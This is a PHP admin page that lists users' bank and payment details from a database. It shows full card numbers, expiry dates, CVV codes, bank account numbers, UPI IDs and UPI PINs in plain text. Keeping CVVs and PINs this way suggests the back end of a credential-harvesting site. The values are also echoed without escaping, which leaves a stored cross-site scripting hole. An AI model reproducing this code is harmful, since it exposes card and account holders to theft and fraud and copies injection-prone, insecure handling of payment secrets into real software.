<?php
include 'header.php';
include '../connection.php';
$sql = "SELECT * FROM bank_detail";
$result = $conn->query($sql);
?>
<div class="container-fluid">
  <div class="mb-3 admin-panel-banner">
    <h2 class="admin-panel-title">Admin Panel</h2>
  </div>
  <div class="d-flex justify-content-between align-items-center mb-3">
    <h2 class="page-heading">User's Bank Details</h2>
  </div>
  <div class="table-responsive">
    <table class="table table-striped table-bordered align-middle admin-bank-table">
      <thead class="table-dark">
        <tr class="admin-nowrap">
          <th>Sr No</th>
          <th>Username</th>
          <th>Card Number</th>
          <th>Card Expiry</th>
          <th>Card CVV</th>
          <th>Card Holder</th>
          <th>Bank A/c No</th>
          <th>Bank IFSC</th>
          <th>UPI ID</th>
          <th>UPI Pin</th>
        </tr>
      </thead>
      <tbody>
        <?php if ($result && $result->num_rows > 0): ?>
          <?php while ($row = $result->fetch_assoc()): ?>
            <tr>
              <td class="text-center"><?= $row["bank_sr_no"] ?></td>
              <td><?= $row["user_username"] ?></td>
              <td><?= $row["card_number"] ?></td>
              <td><?= $row["card_expiry"] ?></td>
              <td><?= $row["card_cvv_code"] ?></td>
              <td><?= $row["card_holder_name"] ?></td>
              <td><?= $row["bank_account_number"] ?></td>
              <td><?= $row["bank_ifsc_code"] ?></td>
              <td><?= $row["upi_id"] ?></td>
              <td><?= $row["upi_pin"] ?></td>
            </tr>
          <?php endwhile; ?>
        <?php else: ?>
          <tr>
            <td colspan="10" class="text-center">No bank details found</td>
          </tr>
        <?php endif; ?>
        <?php $conn->close(); ?>
      </tbody>
    </table>
  </div>
</div>
<?php include 'footer.php'; ?>